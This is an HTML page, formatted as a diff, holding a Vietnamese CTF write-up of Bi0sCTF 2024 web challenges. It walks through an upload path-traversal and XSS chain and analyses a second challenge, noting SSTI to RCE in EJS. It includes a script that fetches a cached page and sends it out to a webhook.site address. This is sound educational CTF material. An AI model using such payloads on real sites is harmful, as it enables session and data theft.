@@ -1,0 +1,1744 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Bi0sCTF 2024 - WEB &#39;s challenges - Zoltán&#39;s Blog</title>
+  <meta name="description" content="WEB challs Image gallery 1 Đây là một bài white box với chức năng upload file tạo note và xem note cùng với share cho admin
+Bắt đầu đi vào với file app.js
+Có thể thấy source là :
+const express = require(&#39;express&#39;);const cookieParser = require(&#39;cookie-parser&#39;);const fs = require(&#39;fs&#39;);const ejs = require(&#39;ejs&#39;);const path = require(&quot;path&quot;); const fileUpload = require(&#39;express-fileupload&#39;);const {randomUUID } = require(&quot;crypto&quot;);const { visit } = require(&#39;.">
+  <meta name="author" content="Zoltán Balogh"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Zoltán\u0027s Blog",
+    
+    "url": "https:\/\/bzoltan1.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/bzoltan1.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/write-up\/2024-01-28-bi0sctf2024\/",
+          "name": "Bi0s ctf 2024 web \u0027s challenges"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "Bi0sCTF 2024 - WEB \u0027s challenges",
+  "description" : "WEB challs Image gallery 1 Đây là một bài white box với chức năng upload file tạo note và xem note cùng với share cho admin\nBắt đầu đi vào với file app.js\nCó thể thấy source là :\nconst express = require(\u0027express\u0027);\rconst cookieParser = require(\u0027cookie-parser\u0027);\rconst fs = require(\u0027fs\u0027);\rconst ejs = require(\u0027ejs\u0027);\rconst path = require(\u0026quot;path\u0026quot;); const fileUpload = require(\u0027express-fileupload\u0027);\rconst {randomUUID } = require(\u0026quot;crypto\u0026quot;);\rconst { visit } = require(\u0027.",
+  "inLanguage" : "en",
+  "wordCount":  5958 ,
+  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
+  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
+  "image" : "https:\/\/bzoltan1.github.io\/avatar.png",
+  "keywords" : [ "CTF, Vietnamese" ],
+  "mainEntityOfPage" : "https:\/\/bzoltan1.github.io\/write-up\/2024-01-28-bi0sctf2024\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/bzoltan1.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/bzoltan1.github.io\/avatar.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="Bi0sCTF 2024 - WEB &#39;s challenges" />
+<meta property="og:description" content="WEB challs Image gallery 1 Đây là một bài white box với chức năng upload file tạo note và xem note cùng với share cho admin
+Bắt đầu đi vào với file app.js
+Có thể thấy source là :
+const express = require(&#39;express&#39;);const cookieParser = require(&#39;cookie-parser&#39;);const fs = require(&#39;fs&#39;);const ejs = require(&#39;ejs&#39;);const path = require(&quot;path&quot;); const fileUpload = require(&#39;express-fileupload&#39;);const {randomUUID } = require(&quot;crypto&quot;);const { visit } = require(&#39;.">
+<meta property="og:image" content="https://bzoltan1.github.io/avatar.png" />
+<meta property="og:url" content="https://bzoltan1.github.io/write-up/2024-01-28-bi0sctf2024/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Zoltán&#39;s Blog" />
+
+  <meta name="twitter:title" content="Bi0sCTF 2024 - WEB &#39;s challenges" />
+  <meta name="twitter:description" content="WEB challs Image gallery 1 Đây là một bài white box với chức năng upload file tạo note và xem note cùng với share cho admin
+Bắt đầu đi vào với file app.js
+Có thể thấy source là :
+const express = …">
+  <meta name="twitter:image" content="https://bzoltan1.github.io/avatar.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://bzoltan1.github.io/avatar.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <link rel="alternate" href="https://bzoltan1.github.io/index.xml" type="application/rss+xml" title="Zoltán&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://bzoltan1.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/syntax.css" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="https://bzoltan1.github.io/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://bzoltan1.github.io/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Home" href="https://bzoltan1.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://bzoltan1.github.io/about">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Zoltán&#39;s Blog" href="https://bzoltan1.github.io/">
+            <img class="avatar-img" src="https://bzoltan1.github.io/avatar.png" alt="Zoltán&#39;s Blog" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="write-up-heading">
+              
+                <h1>Bi0sCTF 2024 - WEB &#39;s challenges</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <!-- raw HTML omitted -->
+<h1 id="web-challs">WEB challs</h1>
+<h2 id="image-gallery-1">Image gallery 1</h2>
+<p>Đây là một bài white box với chức năng upload file tạo note và xem note cùng với share cho admin</p>
+<p>Bắt đầu đi vào với file app.js</p>
+<p>Có thể thấy source là :</p>
+<pre><code>const express = require('express');
+const cookieParser = require('cookie-parser');
+const fs = require('fs');
+const ejs = require('ejs');
+const path = require(&quot;path&quot;); 
+const fileUpload = require('express-fileupload');
+const {randomUUID } =  require(&quot;crypto&quot;);
+const { visit } = require('./bot');
+const flag_id = randomUUID();
+const maxSizeInBytes = 3 * 1024 * 1024;
+
+const plantflag = () =&gt; {
+
+  fs.mkdirSync(path.join(__dirname,`/public/${flag_id}`))
+  fs.writeFileSync(path.join(__dirname,`/public/${flag_id}/flag.txt`),process.env.FLAG||'flag{asdf_asdf}')
+
+}
+
+const app = express();
+
+app.set('view engine', 'ejs');
+app.use(express.static('public'));
+app.use(cookieParser());
+app.use(fileUpload());
+app.use(express.json())
+
+
+app.get('/', async(req, res) =&gt; {
+
+  if(req.cookies.sid &amp;&amp; /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/.test(req.cookies.sid)){
+
+    try {
+
+      const files = btoa(JSON.stringify(fs.readdirSync(path.join(__dirname,`/public/${req.cookies.sid}`))));
+      return res.render('index', {files: files,id : req.cookies.sid});
+  
+    } catch (err) {}  
+  }
+
+  let id = randomUUID();
+  fs.mkdirSync(path.join(__dirname,`/public/${id}`))
+  res.cookie('sid',id,{httpOnly: true}).render('index', {files: null, id: id});
+  return;
+
+});
+
+app.post('/upload',async(req,res) =&gt; {
+
+  if (!req.files || !req.cookies.sid) {
+    return res.status(400).send('Invalid request');
+  }
+    try{
+      const uploadedFile = req.files.image;
+      if (uploadedFile.size &gt; maxSizeInBytes) {
+        return res.status(400).send('File size exceeds the limit.');
+      }
+      await uploadedFile.mv(`./public/${req.cookies.sid}/${uploadedFile.name}`);
+   }catch{
+      return res.status(400).send('Invalid request');
+   }
+
+  res.status(200).redirect('/');
+  return
+})
+
+app.post('/share',async(req,res) =&gt; {
+
+  let id = req.body.id
+  await visit(flag_id,id);
+  res.send('Sucess')
+  return
+
+})
+
+const port = 3000;
+app.listen(port, () =&gt; {
+  plantflag()
+  console.log(`Server is running on port ${port}`);
+});
+
+</code></pre><p>Bây giờ thì chúng ta cùng nhau phân tích một tí file này :&gt;
+Sever sử dụng expressjs để tạo một sever, khi mà chạy local thì run trên port 3000 trước tiên sẽ gọi đến hàm planflag để config các kiểu cho sever:</p>
+<pre><code>const plantflag = () =&gt; {
+
+  fs.mkdirSync(path.join(__dirname,`/public/${flag_id}`))
+  fs.writeFileSync(path.join(__dirname,`/public/${flag_id}/flag.txt`),process.env.FLAG||'flag{asdf_asdf}')
+
+}
+</code></pre><p>Có thể thấy là sever sẽ tạo một thư mục có tên là flag-id được generate radom với hàm const {randomUUID } =  require(&ldquo;crypto&rdquo;);
+Sau đó sẽ tạo một file có tên flag.txt và viết vào trong đó nội dung là flag mà chúng ta cần tìm, vì vậy mục tiêu là tìm được tên của thư mục đó để lấy được :&gt;
+Đi sâu vào xem xét tiếp thì sever có 3 route:</p>
+<h3 id="route--">Route / :</h3>
+<p>ở route này sever sẽ nhận cookie của người dùng và lấy giá trị là sid check cùng với regex <code>[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$</code> ban đầu em có ý tưởng là bypass regex này mà lỏ quá
+Sau đó sẽ tạo một giá trị file qua hàm btoa giá trị của các file trong thư mục public/${sid} và hiển thị với file index với giá trị file và id
+Chúng ta có thể nhìn thấy nó dùng ở đây:</p>
+<pre><code> &lt;% if (files) { %&gt;
+    const fileNames = JSON.parse(atob('&lt;%= files %&gt;'))
+    
+        for(i=0;i&lt;fileNames.length;i++){
+          fileName = fileNames[i]
+          const imgElement = document.createElement('img');
+          imgElement.src = `/&lt;%= id %&gt;/${fileName}`;
+
+          imgElement.alt = `Image: ${fileName}`;
+
+          galleryDiv.appendChild(imgElement);
+        }
+
+  &lt;% } %&gt;
+</code></pre><p>ở đây sẽ tạo một thẻ img và hiển thị các giá trị sau như là sources với   <code> imgElement.src = `/&lt;%= id %&gt;/${fileName}`;</code>
+sau đó sẽ random một uuId tiếp và tạo một thư mục với uuid đấy cuối cùng hiển thị với file index các giá trị file là null và id là id vừa gen ra</p>
+<h3 id="route-upload">route /upload</h3>
+<pre><code>app.post('/upload',async(req,res) =&gt; {
+
+  if (!req.files || !req.cookies.sid) {
+    return res.status(400).send('Invalid request');
+  }
+    try{
+      const uploadedFile = req.files.image;
+      if (uploadedFile.size &gt; maxSizeInBytes) {
+        return res.status(400).send('File size exceeds the limit.');
+      }
+      await uploadedFile.mv(`./public/${req.cookies.sid}/${uploadedFile.name}`);
+   }catch{
+      return res.status(400).send('Invalid request');
+   }
+
+  res.status(200).redirect('/');  
+  return
+})
+</code></pre><p>ở đây sẽ cho phép chúng ta upload 1 file lên và di chuyển vào <code>await uploadedFile.mv(`./public/${req.cookies.sid}/${uploadedFile.name}`);</code> sau đó sẽ redirect đến route /</p>
+<h3 id="route-share">Route /share</h3>
+<pre><code>app.post('/share',async(req,res) =&gt; {
+
+  let id = req.body.id
+  await visit(flag_id,id);
+  res.send('Sucess')
+  return
+
+})
+</code></pre><p>ở đây sẽ gọi đến hàm visit được import từ bot.js</p>
+<pre><code>const puppeteer = require(&quot;puppeteer&quot;);
+const fs = require(&quot;fs&quot;);
+
+
+async function visit(flag_id,id) {
+  const browser = await puppeteer.launch({
+    args: [
+        &quot;--no-sandbox&quot;,
+        &quot;--headless&quot;
+    ],
+    executablePath: &quot;/usr/bin/google-chrome&quot;,
+  });
+
+  try {
+
+    let page = await browser.newPage();
+
+		await page.setCookie({
+      
+			httpOnly: true,
+			name: 'sid',
+			value: flag_id,
+			domain: 'localhost',
+      
+		});
+
+		page = await browser.newPage();
+
+    await page.goto(`http://localhost:3000/`);
+
+    await new Promise((resolve) =&gt; setTimeout(resolve, 3000));
+
+    await page.goto(
+      `http://localhost:3000/?f=${id}`,
+      { timeout: 5000 }
+    );
+
+    await new Promise((resolve) =&gt; setTimeout(resolve, 3000));
+    
+    await page.close();
+    await browser.close();
+
+  } catch (e) {
+    console.log(e);
+    await browser.close();
+  }
+}
+
+module.exports = { visit };
+</code></pre><p>Sử dụng chronium puppeteer tạo một page  và set cookie</p>
+<pre><code>await page.setCookie({
+      
+			httpOnly: true,
+			name: 'sid',
+			value: flag_id,
+			domain: 'localhost',
+      
+		});
+
+</code></pre><p>sau đó truy cập vào localhost 2 lần, ở đây bạn có thể nhận thấy rằng server gọi 2 lần để vào trang này và cách nhau 3s</p>
+<p>và lần sau lại vào <code>http://localhost:3000/?f=${id}</code> với id của người dùng
+Vậy bây giờ mình sẽ có thể hiểu cách để lấy được flag và sẽ tạo 1 file XSS sau đó share cho con bot nó sẽ check để hiển thị thông tin của file flag
+Nhưng mà vấn đề ở đây là page nó đã set httpOnly rồi nên chúng ta sẽ không thể lấy được cái sid là flag-id lúc này, đầu tiền mình đã tìm vài cách để bypass như là TRACE hay là overwrite cookie nhưng mà vẫn không khả thi.
+Lưu ý là giá trị sid khi upload có thể thay đổi được nên lúc này chúng ta có thể upload file với path-traversal, lúc này mình cũng nhận thấy răng khi mà set template để render sever cũng không gán mặc định đó đến thư mục view, vì vậy nếu mà mình để 1 file index.html vào trong thư mục public thì sao, đương nhiên là nó sẽ hiển thị file này của mình khi mình get /.
+Theo như giải thích của các anh thì mình có thể hiểu được là nếu mà bây giờ mình thử tạo một script fetch lấy nội dung với route / thì nội dung nhận được sẽ là nội dung của file index mình ghi đè mình nhận được sau khi mở page lần 2, vậy nên ý tưởng ở đây là lần đầu đợi bot vào trang lần đầu kia đã vì có thời gian delay nên 2 tầm 2s mình ghi đè file index với nội dung</p>
+<pre><code>&lt;script&gt;
+fetch(&quot;/&quot;, {&quot;cache&quot;:&quot;force-cache&quot;}).then(r =&gt; r.text()).then(r =&gt; fetch(&quot;https://webhook.site/1866faa7-11e6-421d-8b25-5efeefe3748e?f=&quot;+ btoa(r)))
+&lt;/script&gt;
+</code></pre><p>Ta có thể hiểu là cơ chế force-cache của hàm fetch là cơ chế nhằm giảm thiểu tải trọng load nhằm tăng hiệu suất cho trang web nó sẽ không gọi đến api mà sử dụng bộ đệm của chrome và lúc này toàn bộ cái dữ liệu được ghi lại trong bộ đệm lúc này sẽ trả ra ở res của mình và gửi đến webhook và sẽ nhận được đoạn nội dung, cần chú ý ở đoạn này</p>
+<pre><code>   imgElement.src = `/&lt;%= id %&gt;/${fileName}`;
+</code></pre><p>chỗ này thì khi mà load thành công giá trị của id sẽ là flag-id do con bot đã check tại hàm visit và lúc này chúng ta có thể nhận được flag-id
+cuối cùng chỉ cần mở file /flag-id/flag.txt và ta có thể nhận được flag</p>
+<h3 id="triển-khai">Triển khai</h3>
+<p>Vào trong giao diện sẽ có nội dung như này:</p>
+<p><img src="https://hackmd.io/_uploads/HkGNRBJ6a.png" alt="image"></p>
+<p>Đầu tiên là upload 1 ảnh bất kì lên sau đó có chức năng share khi click vào ảnh</p>
+<p><img src="https://hackmd.io/_uploads/S1mdCBypT.png" alt="image"></p>
+<p>Mình sẽ bắt burp lại các quá trình này ở share và upload
+Đầu tiên là share ảnh mình đã upload lên</p>
+<p><img src="https://hackmd.io/_uploads/HyN0ASy6T.png" alt="image">
+Sau đó khoảng 2s thì sẽ upload path traversal file index.html để ghi đè file index mặc định và lúc này bot check lần 2 sẽ hiển thị file này sẽ sẽ thực hiện script fetch force-cache mà bot check lần 1</p>
+<p><img src="https://hackmd.io/_uploads/B1OEk8yT6.png" alt="image"></p>
+<p>Check trong webhook thì thấy có kết quả như này:</p>
+<p><img src="https://hackmd.io/_uploads/Bktvk81ap.png" alt="image"></p>
+<p>sau đó em decode base64 thì được nội dung</p>
+<p><img src="https://hackmd.io/_uploads/B1ccJIJ6T.png" alt="image"></p>
+<p>Cùng quan sát kĩ 1 chút</p>
+<p><img src="https://hackmd.io/_uploads/HkwhkIy66.png" alt="image"></p>
+<p>Như đã giải thích ở trên là id này sẽ là giá trị của flag-id hiển thị từ sever render template
+Bây giờ thì lấy flag thôi</p>
+<p><img src="https://hackmd.io/_uploads/rkeWe8k6a.png" alt="image"></p>
+<h2 id="require-notes">Require Notes</h2>
+<p>Đây cũng là một bài white box khá là hóc búa</p>
+<p>Chức năng của trang web là ghi lại note và hiển thị note của mình.
+Let &rsquo;s go hãy cũng nhau phân tích rõ ràng source code của bài này.</p>
+<p>Khi chạy sever thì sẽ thực hiện config để setup và tạo flag</p>
+<pre><code>let noteList = [];
+let flag = process.env.FLAG;
+if(!flag){
+  flag='{&quot;title&quot;:&quot;flag&quot;,&quot;content&quot;:&quot;bi0sctf{fake_flag}&quot;}';
+}
+else{
+  flag=`{&quot;title&quot;:&quot;flag&quot;,&quot;content&quot;:&quot;${flag}&quot;}`;
+}
+const flagid = generateNoteId(16);
+const healthCheckId='Healthcheck';
+fs.writeFileSync(`./notes/${flagid}.json`, flag);
+fs.writeFileSync(`./notes/${healthCheckId}.json`, '{&quot;title&quot;:&quot;Healthcheck&quot;,&quot;content&quot;:&quot;success&quot;}');
+</code></pre><p>có thể thấy là flag chứa trong <code>./notes/${flagid}.json</code> vì vậy mục tiêu của chúng ta là tìm được giá trị của nó và cờ sẽ ló ra :100:</p>
+<h3 id="route-create">Route /create</h3>
+<p>Route này chứa cả 2 method là get và post:
+Đầu tiên là method get thì sẽ hiển thị cho chúng ta chúng ta template ejs /create và hiển thị với giá trị của noteList.</p>
+<pre><code>app.get('/create', (req, res) =&gt; {
+  return res.render('create', { noteList, Message: false });
+});
+</code></pre><p>Tiếp theo là method post</p>
+<pre><code>app.post('/create', (req, res) =&gt; {
+  requestBody=req.body
+  try{
+    schema = fs.readFileSync('./settings.proto', 'utf-8');
+    root = protobuf.parse(schema).root;
+    Note = root.lookupType('Note');
+    errMsg = Note.verify(requestBody);
+
+    if (errMsg){
+      return res.json({ Message: `Verification failed: ${errMsg}` });
+    }
+    buffer = Note.encode(Note.create(requestBody)).finish();
+    decodedData = Note.decode(buffer).toJSON();
+
+    const noteId = generateNoteId(16);
+    fs.writeFileSync(`./notes/${noteId}.json`, JSON.stringify(decodedData));
+    noteList.push(noteId);
+
+    return res.json({Message: 'Note created successfully!',Noteid: noteId });
+  }
+  catch (error) {
+    console.error(error);
+    res.status(500).json({Message: 'Internal server error' });
+  }
+});
+</code></pre><p>từ source ta có thể thấy rằng sever sẽ lấy nội dung note của chúng ta sẽ đó đọc file .proto và lấy ra mục Note check xem nội dung có phù hợp với Note không nếu không thì trả ra lỗi còn phù hợp thì tiếp tục check và khi giá trị vào trong <code>./notes/${noteId}.json</code> với nodeId là giá trị được random.
+Và push nodeId vào trong <code>let noteList = [];</code></p>
+<h3 id="route-">Route /</h3>
+<pre><code>app.get('/', (req, res) =&gt; {
+  return res.redirect('/create');
+});
+</code></pre><p>Khi vào này sẽ redirect đến /create</p>
+<h3 id="route-delete">Route /delete</h3>
+<pre><code>app.get('/delete', (req,res) =&gt; {
+  cleanserver();
+  return res.json({Message: 'Notes deleted successfully!'});
+});
+</code></pre><p>sẽ thực hiện xóa note bằng việc clean cache</p>
+<pre><code>const cleanserver = () =&gt; {
+  Object.keys(require.cache).forEach(i =&gt; {
+    delete require.cache[i];
+  });
+};
+</code></pre><h3 id="route-searchnoteid">Route /search/:noteId</h3>
+<pre><code>app.get('/search/:noteId', (req, res) =&gt; {
+  const noteId = req.params.noteId;
+  const notes=glob.sync(`./notes/${noteId}*`);
+  if(notes.length === 0){
+    return res.json({Message: &quot;Not found&quot;});
+  }
+  else{
+    try{
+      fs.accessSync(`./notes/${noteId}.json`);
+      return res.json({Message: &quot;Note found&quot;});
+    }
+    catch(err){
+      return res.status(500).json({ Message: 'Internal server error' });
+    }
+  }
+})
+</code></pre><p>Nhận lấy param nodeId và dùng module glob và gán giá trị cho notes với <code>const notes=glob.sync(`./notes/${noteId}*`);</code> trả về một mảng chứa tên dường dẫn tuyệt đối của các thư mục phù hợp
+Sau đó kiểm tra xem file nodeId.json có tồn tại hay không và thông báo nếu kết quả.</p>
+<p>Lưu ý răng /search chứa một midlleware sẽ check như sau:</p>
+<pre><code>const restrictToLocalhost = (req, res, next) =&gt; {
+  const remoteAddress = req.connection.remoteAddress;
+  if (remoteAddress === '::1' || remoteAddress === '127.0.0.1' || remoteAddress === '::ffff:127.0.0.1') {
+    next();
+  } else {
+    res.status(403).json({ Message: 'Access denied' });
+  }
+};
+</code></pre><p>theo mình thấy thì nó sẽ lấy ip của máy truy cập và nếu local thì mới cho phép truy cập</p>
+<h3 id="route-customise">route /customise</h3>
+<pre><code>app.get('/customise', (req, res) =&gt; {
+  return res.render('customise');
+});
+
+app.post('/customise',(req, res) =&gt; {
+  try {
+    const { data } = req.body;
+
+    let author = data.pop()['author'];
+
+    let title = data.pop()['title'];
+
+    let protoContents = fs.readFileSync('./settings.proto', 'utf-8').split('\n');
+
+    if (author) {
+      protoContents[5] = `  ${author} string author = 3 [default=&quot;user&quot;];`;
+    }
+
+    if (title) {
+      protoContents[3] = `  ${title} string title = 1 [default=&quot;user&quot;];`;
+    }
+
+    fs.writeFileSync('./settings.proto', protoContents.join('\n'), 'utf-8');
+
+    return res.json({ Message: 'Settings changed' });
+  } catch (error) {
+    console.error(error);
+    res.status(500).json({ Message: 'Internal server error' });
+  }
+})
+</code></pre><p>route này cũng có 2 method là get thì sẽ render template customise còn post thì:
+Lấy dữ liệu data sau đó lấy dữ liệu author và title rồi đọc file settings.proto và chuyển từng dòng thành từng mảng gán giá trị cho <code>protoContents</code> kiểm tra nếu có author thì sẽ gán <code>protoContents[5] = `  ${author} string author = 3 [default=&quot;user&quot;];`;</code> và có title sẽ gán <code>protoContents[3] = `  ${title} string title = 1 [default=&quot;user&quot;];`;</code>
+cuối cùng viết lại với nội dung file đã thêm vào file settings.proto ban đầu</p>
+<h3 id="route-healthcheck">Route /healthcheck</h3>
+<pre><code>app.get('/healthcheck',async(req,res)=&gt;{
+  try {
+    await healthCheck();
+
+    return res.json({ Message: 'healthcheck successful' });
+  } catch (error) {
+    console.error(error);
+    return res.json({ Message: 'healthcheck failed' });
+  }
+});
+</code></pre><p>sẽ gọi đến hàm healthcheck ở trong file bot.js</p>
+<pre><code>const puppeteer = require('puppeteer');
+
+async function healthCheck(){
+  const browser = await puppeteer.launch({
+    headless: true,
+    args:['--no-sandbox']
+  });
+
+  const page = await browser.newPage();
+  await page.setJavaScriptEnabled(false)
+  const response=await page.goto(&quot;http://localhost:3000/view/Healthcheck&quot;)
+  await browser.close();
+}
+
+module.exports = { healthCheck };
+
+</code></pre><p>sử dụng chromium puppeteer và get /view/Healthcheck để xem nội dung của file Healthcheck.json</p>
+<h3 id="phân-tích-các-lỗ-hổng-trong-lib">Phân tích các lỗ hổng trong lib</h3>
+<h4 id="1-ssti-to-rce-ejs-319">1. SSTI TO RCE EJS 3.1.9</h4>
+<p>Như ta có thể thấy là chương trình sử dụng template ejs 3.1.9 dính phải SSTI sink nằm ở escapeFn:</p>
+<pre><code>/*
+ * EJS Embedded JavaScript templates
+ * Copyright 2112 Matthew Eernisse (mde@fleegix.org)
+ *
+ * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ *         http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ *
+*/
+
+'use strict';
+
+/**
+ * @file Embedded JavaScript templating engine. {@link http://ejs.co}
+ * @author Matthew Eernisse &lt;mde@fleegix.org&gt;
+ * @author Tiancheng &quot;Timothy&quot; Gu &lt;timothygu99@gmail.com&gt;
+ * @project EJS
+ * @license {@link http://www.apache.org/licenses/LICENSE-2.0 Apache License, Version 2.0}
+ */
+
+/**
+ * EJS internal functions.
+ *
+ * Technically this &quot;module&quot; lies in the same file as {@link module:ejs}, for
+ * the sake of organization all the private functions re grouped into this
+ * module.
+ *
+ * @module ejs-internal
+ * @private
+ */
+
+/**
+ * Embedded JavaScript templating engine.
+ *
+ * @module ejs
+ * @public
+ */
+
+
+var fs = require('fs');
+var path = require('path');
+var utils = require('./utils');
+
+var scopeOptionWarned = false;
+/** @type {string} */
+var _VERSION_STRING = require('../package.json').version;
+var _DEFAULT_OPEN_DELIMITER = '&lt;';
+var _DEFAULT_CLOSE_DELIMITER = '&gt;';
+var _DEFAULT_DELIMITER = '%';
+var _DEFAULT_LOCALS_NAME = 'locals';
+var _NAME = 'ejs';
+var _REGEX_STRING = '(&lt;%%|%%&gt;|&lt;%=|&lt;%-|&lt;%_|&lt;%#|&lt;%|%&gt;|-%&gt;|_%&gt;)';
+var _OPTS_PASSABLE_WITH_DATA = ['delimiter', 'scope', 'context', 'debug', 'compileDebug',
+  'client', '_with', 'rmWhitespace', 'strict', 'filename', 'async'];
+// We don't allow 'cache' option to be passed in the data obj for
+// the normal `render` call, but this is where Express 2 &amp; 3 put it
+// so we make an exception for `renderFile`
+var _OPTS_PASSABLE_WITH_DATA_EXPRESS = _OPTS_PASSABLE_WITH_DATA.concat('cache');
+var _BOM = /^\uFEFF/;
+var _JS_IDENTIFIER = /^[a-zA-Z_$][0-9a-zA-Z_$]*$/;
+
+/**
+ * EJS template function cache. This can be a LRU object from lru-cache NPM
+ * module. By default, it is {@link module:utils.cache}, a simple in-process
+ * cache that grows continuously.
+ *
+ * @type {Cache}
+ */
+
